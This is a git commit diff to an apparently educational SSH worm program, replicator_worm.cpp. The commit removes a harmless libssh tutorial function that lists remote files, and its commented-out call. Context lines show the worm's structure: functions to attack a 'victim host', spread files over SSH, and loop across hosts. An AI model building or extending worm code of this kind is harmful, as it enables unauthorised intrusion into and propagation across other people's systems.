0e89cfe1ca2704b8930e82eb252070edeedf6a3f
David Dang <ddang.sw@gmail.com>
2016-10-08 08:58:47 -0700

    remove sample execute and show files code from libssh tutorial from program

--- replicator_worm.cpp
+++ replicator_worm.cpp
@@ -498,55 +498,6 @@ ssh_session attackSystem(const string host) {
 }
 
 /*******************************************************************************
- * Function:
- * @param host a string contains the IP of the victim host
- * @return a valid active ssh_session or NULL if not
- ******************************************************************************/
-int show_remote_files(ssh_session session) {
-  ssh_channel channel;
-  int rc;
-  channel = ssh_channel_new(session);
-  if (channel == NULL) return SSH_ERROR;
-  rc = ssh_channel_open_session(channel);
-  if (rc != SSH_OK)
-  {
-    ssh_channel_free(channel);
-    return rc;
-  }
-  rc = ssh_channel_request_exec(channel, "ls -l abc");
-  if (rc != SSH_OK)
-  {
-    ssh_channel_close(channel);
-    ssh_channel_free(channel);
-    return rc;
-  }
-
-  char buffer[256];
-  int nbytes;
-  nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
-  while (nbytes > 0)
-  {
-    if (fwrite(buffer, 1, nbytes, stdout) != nbytes)
-    {
-      ssh_channel_close(channel);
-      ssh_channel_free(channel);
-      return SSH_ERROR;
-    }
-    nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
-  }
-  if (nbytes < 0)
-  {
-    ssh_channel_close(channel);
-    ssh_channel_free(channel);
-    return SSH_ERROR;
-  }
-  ssh_channel_send_eof(channel);
-  ssh_channel_close(channel);
-  ssh_channel_free(channel);
-  return SSH_OK;
-}
-
-/*******************************************************************************
  * Function: spreadFile
  * @param sshClient an active ssh session
  * @param source is a string contain the path to the source file
@@ -785,8 +736,6 @@ int main (int argc, const char **argv) {
             printf("Unsuccessfully attack host %s.  Move to next one.\n", host.c_str());
             continue;
         }
-
-        //int rc = show_remote_files(sshClient);
 
         // If we get here, it means that we have a good sshClient
 
